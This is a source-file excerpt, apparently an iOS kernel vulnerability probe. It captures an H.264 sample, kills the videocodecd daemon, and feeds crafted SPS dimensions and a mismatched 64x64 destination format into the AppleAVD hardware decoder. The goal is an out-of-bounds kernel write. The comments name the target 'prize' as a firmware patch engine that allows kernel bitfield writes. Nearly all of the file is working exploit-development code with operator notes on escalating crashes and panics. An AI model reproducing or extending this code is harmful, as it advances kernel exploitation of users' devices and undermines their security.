    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128, kCMVideoCodecType_H264,
                                             NULL, NULL, NULL, ave_out_cb, NULL, &cs);
    if (st != 0 || !cs) {
        dprintf(STDOUT_FILENO, "%s  K[cap] encode session FAILED st=%d\n", pfx, (int)st);
        g_ave_cap_on = 0;
        return -1;
    }
    int rc = 0, sig = 0;
    sig = ds_ave_guard_run_tmo(^int {
        OSStatus p = VTCompressionSessionPrepareToEncodeFrames(cs);
        if (p != 0) return (int)p;
        for (int i = 0; i < 2 && !g_ave_cap_sb; i++) {
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (attrs) {
                CVPixelBufferCreate(kCFAllocatorDefault, 128, 128, kCVPixelFormatType_32BGRA, attrs, &pb);
                CFRelease(attrs);
            }
            if (!pb) return -9998;
            if (CVPixelBufferLockBaseAddress(pb, 0) == 0) {
                void *b = CVPixelBufferGetBaseAddress(pb);
                for (size_t y = 0; y < 128; y++) {
                    uint8_t *row = (uint8_t *)b + y * CVPixelBufferGetBytesPerRow(pb);
                    for (size_t x = 0; x < CVPixelBufferGetBytesPerRow(pb); x++)
                        row[x] = (uint8_t)(0x30 + y + x + i * 7);
                }
                CVPixelBufferUnlockBaseAddress(pb, 0);
            }
            CMTime pts = CMTimeMake(i, 30);
            CMTime dur = CMTimeMake(1, 30);
            VTCompressionSessionEncodeFrame(cs, pb, pts, dur, NULL, NULL, NULL);
            CFRelease(pb);
            for (int w = 0; w < 20 && !g_ave_cap_sb; w++) usleep(50000);
        }
        return 0;
    }, &rc, 15000);
    g_ave_cap_on = 0;
    VTCompressionSessionInvalidate(cs);
    CFRelease(cs);
    if (sig > 0) dprintf(STDOUT_FILENO, "%s  K[cap] FAULT sig=%d\n", pfx, sig);
    if (!g_ave_cap_sb) {
        dprintf(STDOUT_FILENO, "%s  K[cap] capture FAILED (no ok sample)\n", pfx);
        return -1;
    }
    dprintf(STDOUT_FILENO, "%s  K[cap] captured (fires=%ld ok=%ld bytes=%llu)\n", pfx,
            (long)g_ave_cb_fires, (long)g_ave_cb_ok, (unsigned long long)g_ave_cb_bytes);
    /* r4: KEEP the sample alive - AV0 decodes it intact under its own format */
    return ds_avd_extract_corpus(pfx);
}

/* r8: launch-arg parameterization - the singleton/kext config pins the FIRST
 * format per kext lifetime (r6/r7 evidence: CanAccept compares incoming dims
 * vs the config set by the first create; the daemon kill does NOT reset it),
 * so the crafted-dims frontier is ONE SHOT PER BOOT:
 *   -avdskip128        skip the 128x128 baseline (the craft becomes the first create)
 *   -avdnokill         do NOT ds_tk_kill before the craft (the pure first-create test)
 *   -avdsps WxH        the crafted SPS dims   (default 16880x8192)
 *   -avdfmt WxH        the format/dest dims  (default = -avdsps; 64x64 = the divergence arm) */
static void ds_avd_args(int *spsW, int *spsH, int *fmtW, int *fmtH, int *skip128, int *nokill)
{
    *spsW = 16880; *spsH = 8192; *fmtW = -1; *fmtH = -1;
    *skip128 = 0; *nokill = 0;
    /* v175: the UI FLAGS FIELD first (ds_flags_*), then the devicectl launch args */
    const char *v;
    int haveSps = 0, haveFmt = 0;
    if ((v = ds_flags_value("-avdsps")) != NULL && sscanf(v, "%dx%d", spsW, spsH) == 2) haveSps = 1;
    if ((v = ds_flags_value("-avdfmt")) != NULL && sscanf(v, "%dx%d", fmtW, fmtH) == 2) haveFmt = 1;
    if (ds_flags_present("-avdskip128")) *skip128 = 1;
    if (ds_flags_present("-avdnokill"))  *nokill = 1;
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    for (NSUInteger i = 0; i + 1 < [args count]; i++) {
        NSString *a = [args objectAtIndex:i];
        if ([a isEqualToString:@"-avdsps"] && !haveSps) {
            NSArray *p = [[args objectAtIndex:i + 1] componentsSeparatedByString:@"x"];
            if ([p count] == 2) {
                int w = [[p objectAtIndex:0] intValue], h = [[p objectAtIndex:1] intValue];
                if (w > 0 && h > 0) { *spsW = w; *spsH = h; haveSps = 1; }
            }
        } else if ([a isEqualToString:@"-avdfmt"] && !haveFmt) {
            NSArray *p = [[args objectAtIndex:i + 1] componentsSeparatedByString:@"x"];
            if ([p count] == 2) {
                int w = [[p objectAtIndex:0] intValue], h = [[p objectAtIndex:1] intValue];
                if (w > 0 && h > 0) { *fmtW = w; *fmtH = h; haveFmt = 1; }
            }
        } else if ([a isEqualToString:@"-avdskip128"] && !*skip128) *skip128 = 1;
        else if ([a isEqualToString:@"-avdnokill"] && !*nokill) *nokill = 1;
    }
    if (*fmtW < 0) { *fmtW = *spsW; *fmtH = *spsH; }
}

void probe_avd(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== K. AVD-DIM-EDGES (v174 - THE RESOLUTION GATE EDGES) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  STATIC CHAIN: AVD self-gates at init (com.apple.videotoolbox.hardwarevideodecoder,\n", pfx);
    dprintf(STDOUT_FILENO, "%s  FUN_fffffff0084bdaec) - the path is videocodecd. The kext setResolutionInfo gate\n", pfx);
    dprintf(STDOUT_FILENO, "%s  is honest unsigned (maxDim 16888, minLim 8192/16384) - the probe drives CRAFTED\n", pfx);
    dprintf(STDOUT_FILENO, "%s  SPS DIMS AT THE EDGES through it: the accept-edge (16880x8192), the over-gate\n", pfx);
    dprintf(STDOUT_FILENO, "%s  reject control (16896x8192), the minLim probe (16768x16768), below-min (16x16),\n", pfx);
    dprintf(STDOUT_FILENO, "%s  and the divergence arm (format 64x64 vs SPS 16880x8192 - the plugin's\n", pfx);
    dprintf(STDOUT_FILENO, "%s  'video resolution %%ux%%u exceeds allocated size %%ux%%u' check). The prize behind\n", pfx);
    dprintf(STDOUT_FILENO, "%s  this gate = the FW command PATCH ENGINE (bounded kernel bitfield writes; the\n", pfx);
    dprintf(STDOUT_FILENO, "%s  alloc-vs-bound size consistency is the candidate). PULL THE KERNEL LOG:\n", pfx);
    dprintf(STDOUT_FILENO, "%s  grep 'AppleAVD' + setResolutionInfo + 'out of range' + DART/GART lines.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  A decode writing past the client buffer = THE 64747. MAY CRASH KERNEL.\n", pfx);

    g_dec_cb_fires = g_dec_cb_ok = g_dec_cb_err = 0;
    g_dec_out_w = g_dec_out_h = 0;

    /* r9: load the TILE path (VideoToolbox is already linked) */
    ds_avd_tileCreate = (ds_avd_pTileCreate)dlsym(RTLD_DEFAULT, "VTTileDecompressionSessionCreate");
    ds_avd_tileInval = (ds_avd_pTileInval)dlsym(RTLD_DEFAULT, "VTTileDecompressionSessionInvalidate");
    ds_avd_tileProps = (ds_avd_pTileProps)dlsym(RTLD_DEFAULT, "VTTileDecompressionSessionCopySupportedPropertyDictionary");
    ds_avd_tileReq = (ds_avd_pTileReq)dlsym(RTLD_DEFAULT, "VTTileDecoderSessionSetTileDecodeRequirements");
    ds_avd_tileDecode = (ds_avd_pTileDecode)dlsym(RTLD_DEFAULT, "VTTileDecompressionSessionDecodeTile");

    int cap = ds_avd_capture(pfx);
    if (cap != 0) {
        dprintf(STDOUT_FILENO, "%s  K corpus capture failed - row void\n", pfx);
        return;
    }

    ds_avd_rawSB = g_ave_cap_sb;   /* r4: AV0 decodes the INTACT sample */
    int spsW, spsH, fmtW, fmtH, skip128, nokill;
    ds_avd_args(&spsW, &spsH, &fmtW, &fmtH, &skip128, &nokill);
    dprintf(STDOUT_FILENO, "%s  K[args] -avdsps %dx%d -avdfmt %dx%d skip128=%d nokill=%d | tileCreate=%p tileProps=%p\n", pfx,
            spsW, spsH, fmtW, fmtH, skip128, nokill,
            (void *)ds_avd_tileCreate, (void *)ds_avd_tileProps);
    if (skip128) {
        /* THE ONE-SHOT FRONTIER CELL: the craft is the FIRST create of this boot
         * (the kext config is virgin) - optionally virgin-daemon too */
        char note[160];
        snprintf(note, sizeof(note), "ONE-SHOT: crafted SPS %dx%d, format %dx%d (first create of the boot)%s",
                 spsW, spsH, fmtW, fmtH, nokill ? "" : " + daemon kill before create");
        if (!nokill) {
            dprintf(STDOUT_FILENO, "%s  K[AV1] killing videocodecd for a virgin singleton...\n", pfx);
            ds_tk_kill(pfx, "AV1kill");
            for (int w = 0; w < 26; w++) usleep(500000);
        }
        ds_avd_cell(pfx, "AV1", note, spsW, spsH, fmtW, fmtH, 0, 1);   /* r9: TILE-FIRST */
    } else {
        ds_avd_cell(pfx, "AV0", "BASELINE: the intact captured sample, 128x128 (the decode oracle sanity)", -1, -1, 128, 128, 0, 0);
        ds_avd_rawSB = NULL;
        /* r8 discriminator: the craft at EXACTLY 128x128 - the dims match the
         * kext config AV0 just set, so ONLY the payload content is the variable */
        ds_tk_kill(pfx, "AV1kill");
        for (int w = 0; w < 26; w++) usleep(500000);
        ds_avd_cell(pfx, "AV1", "PAYLOAD DISCRIMINATOR: crafted SPS/PPS 128x128 (dims match the config - payload-only test)", 128, 128, 128, 128, 0, 0);
    }

    for (int bh = 1; bh <= 2; bh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "AVH%02d beat", bh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }

    if (ds_avd_capBytes) free(ds_avd_capBytes);
    if (g_ave_cap_sb) { CFRelease(g_ave_cap_sb); g_ave_cap_sb = NULL; }
    dprintf(STDOUT_FILENO, "%s  K read-offs:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   THE MODEL (CanAccept @0x29ff2d17c + r6/r7 runs): the daemon decoder pins the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   FIRST format per KEXT lifetime - the config survives daemon kills, so the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   crafted-dims frontier is ONE SHOT PER BOOT (use -avdskip128 -avdsps WxH).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   DEFAULT run (no args): AV0 baseline 128x128 + AV1 = the PAYLOAD DISCRIMINATOR\n", pfx);
    dprintf(STDOUT_FILENO, "%s   (crafted SPS/PPS at 128x128, dims match the config): accept = my avcC/SPS/PPS\n", pfx);
    dprintf(STDOUT_FILENO, "%s   payload is CanAccept-clean (the frontier is dims-only, one shot per boot);\n", pfx);
    dprintf(STDOUT_FILENO, "%s   reject -12911 = the payload itself still differs (compare the bit-depths/\n", pfx);
    dprintf(STDOUT_FILENO, "%s   chroma arms - next: byte-diff my SPS against the capture's).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   -avdskip128 run: the ONE-SHOT craft at -avdsps dims = the kext sees the wild\n", pfx);
    dprintf(STDOUT_FILENO, "%s   geometry as its first config = setResolutionInfo/DART receipts in the kernel\n", pfx);
    dprintf(STDOUT_FILENO, "%s   log; a decode into the 64x64-divergence dest (-avdfmt 64x64) = the OOB arm.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   ANY cell: CLIENT-FAULT / TIMEOUT / PANIC = the wild geometry consumed = escalate.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
